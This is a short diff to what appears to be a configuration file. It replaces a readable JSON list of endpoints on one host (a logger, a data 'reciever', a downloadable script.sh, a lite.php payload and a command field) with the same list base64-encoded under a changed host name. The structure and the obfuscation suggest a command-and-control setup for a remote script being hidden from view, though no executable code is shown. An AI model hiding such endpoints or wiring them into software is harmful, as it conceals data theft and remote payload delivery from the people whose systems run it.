@@ -1,8 +1,1 @@
-{
-"server": "https://domdom112",
-"logger": "https://domdom112/log.php",
-"reciever": "https://domdom112/recieve.php",
-"full": "https://domdom112/script.sh",
-"lite": "https://domdom112/lite.php",
-"command": "command"
-}
+ewoic2VydmVyIjogImh0dHBzOi8vZG9tZG9tMTFkZmFzIiwKImxvZ2dlciI6ICJodHRwczovL2RvbWRvbTExZGZhcy9sb2cucGhwIiwKInJlY2lldmVyIjogImh0dHBzOi8vZG9tZG9tMTFkZmFzL3JlY2lldmUucGhwIiwKImZ1bGwiOiAiaHR0cHM6Ly9kb21kb20xMWRmYXMvc2NyaXB0LnNoIiwKImxpdGUiOiAiaHR0cHM6Ly9kb21kb20xMWRmYXMvbGl0ZS5waHAiLAoiY29tbWFuZCI6ICJjb21tYW5kIgp9Cg==
